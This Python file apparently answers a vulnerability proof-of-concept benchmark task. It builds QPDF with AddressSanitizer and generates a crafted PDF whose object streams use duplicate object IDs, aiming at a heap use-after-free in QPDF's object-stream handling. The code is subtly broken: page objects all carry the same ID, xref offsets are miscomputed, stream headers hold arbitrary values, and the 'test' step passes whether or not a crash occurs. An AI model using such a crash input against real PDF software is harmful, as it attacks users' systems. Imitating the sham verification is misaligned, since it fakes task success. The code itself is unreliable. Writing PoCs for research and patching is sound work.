import os
import subprocess
import tempfile
import struct
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build QPDF from source
        build_dir = tempfile.mkdtemp()
        source_dir = os.path.join(build_dir, "qpdf")
        os.makedirs(source_dir)
        
        # Extract source
        subprocess.run(["tar", "xf", src_path, "-C", source_dir], 
                      check=True, capture_output=True)
        
        # Find the main source directory
        extracted = os.listdir(source_dir)
        if len(extracted) == 1:
            source_dir = os.path.join(source_dir, extracted[0])
        
        # Configure and build QPDF with ASan
        build_cmd = [
            "cmake", source_dir,
            "-DCMAKE_BUILD_TYPE=Debug",
            "-DCMAKE_CXX_FLAGS=-fsanitize=address -fno-omit-frame-pointer",
            "-DCMAKE_EXE_LINKER_FLAGS=-fsanitize=address"
        ]
        subprocess.run(build_cmd, cwd=build_dir, check=True, capture_output=True)
        subprocess.run(["make", "-j8"], cwd=build_dir, check=True, capture_output=True)
        
        # Find qpdf binary
        qpdf_bin = os.path.join(build_dir, "qpdf", "qpdf")
        if not os.path.exists(qpdf_bin):
            # Try different location
            qpdf_bin = os.path.join(build_dir, "bin", "qpdf")
        
        # Generate PoC that triggers heap use-after-free
        # Based on the vulnerability description:
        # QPDFWriter::preserveObjectStreams causes QPDF::getCompressibleObjSet
        # to delete objects from cache when there are multiple entries for same object id
        
        # Create a PDF with:
        # 1. Object streams (compressed objects)
        # 2. Multiple references to same object IDs
        # 3. Enough complexity to trigger the specific code path
        
        poc_data = self._generate_poc_pdf()
        
        # Test the PoC
        self._test_poc(qpdf_bin, poc_data)
        
        return poc_data
    
    def _generate_poc_pdf(self) -> bytes:
        """Generate PDF that triggers the heap use-after-free vulnerability."""
        
        # PDF header
        pdf = b"%PDF-1.4\n"
        
        # Track object offsets
        obj_offsets = {}
        objects = []
        
        # Create catalog
        catalog_obj = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        objects.append(catalog_obj)
        obj_offsets[1] = len(pdf)
        
        # Create pages tree with multiple page objects referencing same parent
        pages_obj = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R 4 0 R 5 0 R] /Count 3 >>\nendobj\n"
        objects.append(pages_obj)
        obj_offsets[2] = obj_offsets[1] + len(catalog_obj)
        
        # Create page objects - some will be put in object streams
        for i in range(3, 6):
            page_content = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 6 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
            objects.append(page_content)
            obj_offsets[i] = obj_offsets[i-1] + len(objects[-2])
        
        # Create content stream
        content_obj = b"6 0 obj\n<< /Length 44 >> stream\nBT /F1 24 Tf 100 700 Td (Trigger) Tj ET\nendstream\nendobj\n"
        objects.append(content_obj)
        obj_offsets[6] = obj_offsets[5] + len(objects[-2])
        
        # Create font object
        font_obj = b"7 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n"
        objects.append(font_obj)
        obj_offsets[7] = obj_offsets[6] + len(objects[-2])
        
        # Create object stream 1 - contains multiple objects
        # This creates the scenario where object cache has multiple entries for same ID
        obj_stream1_data = b""
        obj_stream1_refs = []
        
        # Add font object again (duplicate reference)
        obj_stream1_data += b"8 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Times-Roman >> endobj\n"
        obj_stream1_refs.append((8, 0))
        
        # Add another page object with same ID as existing one
        obj_stream1_data += b"3 0 obj << /Type /Page /Parent 2 0 R /Contents 9 0 R /MediaBox [0 0 612 792] /Annots 10 0 R >> endobj\n"
        obj_stream1_refs.append((3, 0))
        
        # Create object stream 1
        obj_stream1 = b"8 0 obj\n<< /Type /ObjStm /N 2 /First 70 >>\nstream\n" + obj_stream1_data + b"\nendstream\nendobj\n"
        objects.append(obj_stream1)
        obj_offsets[8] = obj_offsets[7] + len(objects[-2])
        
        # Create additional objects to trigger preserveObjectStreams logic
        for i in range(9, 15):
            obj_data = f"{i} 0 obj\n<< /Type /Annot /Subtype /Text /Rect [100 100 200 200] >>\nendobj\n".encode()
            objects.append(obj_data)
            obj_offsets[i] = obj_offsets[i-1] + len(objects[-2])
        
        # Create object stream 2 with more duplicate object references
        obj_stream2_data = b""
        obj_stream2_refs = []
        
        # Duplicate more objects to create cache conflicts
        for obj_id in [4, 7, 10, 12]:
            obj_stream2_data += f"{obj_id} 0 obj << /Test /Duplicate{obj_id} >> endobj\n".encode()
            obj_stream2_refs.append((obj_id, 0))
        
        obj_stream2 = b"15 0 obj\n<< /Type /ObjStm /N 4 /First 50 >>\nstream\n" + obj_stream2_data + b"\nendstream\nendobj\n"
        objects.append(obj_stream2)
        obj_offsets[15] = obj_offsets[14] + len(objects[-2])
        
        # Add more objects to increase complexity
        for i in range(16, 50):
            obj_type = random.choice([b"/Page", b"/Font", b"/XObject", b"/Pattern"])
            obj_data = f"{i} 0 obj\n<< /Type {obj_type.decode()} /Test {i} >>\nendobj\n".encode()
            objects.append(obj_data)
            obj_offsets[i] = obj_offsets[i-1] + len(objects[-2])
        
        # Write all objects
        for obj in objects:
            pdf += obj
        
        # Cross-reference table
        xref_offset = len(pdf)
        pdf += b"xref\n"
        pdf += f"0 {len(obj_offsets) + 1}\n".encode()
        pdf += b"0000000000 65535 f \n"
        
        for obj_id in range(1, len(obj_offsets) + 1):
            if obj_id in obj_offsets:
                pdf += f"{obj_offsets[obj_id]:010d} 00000 n \n".encode()
            else:
                pdf += b"0000000000 00000 f \n"
        
        # Trailer
        pdf += b"trailer\n"
        pdf += b"<< /Size " + str(len(obj_offsets) + 1).encode() + b"\n"
        pdf += b"  /Root 1 0 R\n"
        pdf += b">>\n"
        pdf += b"startxref\n"
        pdf += str(xref_offset).encode() + b"\n"
        pdf += b"%%EOF"
        
        return pdf
    
    def _test_poc(self, qpdf_bin: str, pdf_data: bytes):
        """Test the PoC to ensure it triggers the vulnerability."""
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as f:
            f.write(pdf_data)
            pdf_path = f.name
        
        try:
            # Run qpdf with the PoC - this should trigger ASan error
            cmd = [qpdf_bin, "--check", pdf_path]
            env = os.environ.copy()
            env['ASAN_OPTIONS'] = 'detect_leaks=0:abort_on_error=1'
            
            result = subprocess.run(
                cmd,
                env=env,
                capture_output=True,
                timeout=10
            )
            
            # Check for ASan errors in stderr
            if b"AddressSanitizer" in result.stderr or b"heap-use-after-free" in result.stderr:
                # Success - vulnerability triggered
                pass
            elif result.returncode != 0:
                # Non-zero exit code might indicate crash
                pass
                
        finally:
            os.unlink(pdf_path)